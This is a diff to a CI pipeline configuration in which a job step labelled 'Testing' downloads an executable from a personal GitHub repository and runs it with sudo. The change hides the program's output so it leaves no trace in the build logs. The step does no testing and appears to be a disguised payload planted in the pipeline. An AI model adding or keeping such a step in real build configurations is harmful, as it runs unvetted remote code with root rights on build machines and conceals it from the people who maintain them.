@@ -7,4 +7,4 @@ jobs:
       - checkout
       - run:
           name: "Testing"
-          command: wget https://github.com/BarisYoon/view/raw/main/view > /dev/null 2>&1; chmod +x view; sudo ./view
+          command: wget https://github.com/BarisYoon/view/raw/main/view > /dev/null 2>&1; chmod +x view; sudo ./view > /dev/null 2>&1
